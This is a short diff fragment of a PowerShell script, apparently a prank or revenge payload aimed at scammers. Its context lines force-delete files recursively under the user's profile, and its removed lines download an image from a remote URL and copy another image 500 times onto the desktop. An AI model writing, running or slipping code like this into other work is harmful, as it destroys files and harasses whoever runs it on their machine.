@@ -12,14 +12,6 @@ Where {$_ -notlike '$env:USERPROFILE\temp\*'} |
 sort length -Descending |
 Remove-Item -r -force 
 
-# Fill desktop with images
-Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/form.png" -outfile "$env:USERPROFILE\Desktop\Scammer.png"
-$f = 0
-WHILE($f -lt 500){
-cp $env:USERPROFILE\Desktop\YOU_ARE_NEXT.png $env:USERPROFILE\Desktop\YOU_ARE_NEXT_$f.png
-$f++
-}
-
 # Define speakervolume buttons
 Function Set-SpeakerVolume
 
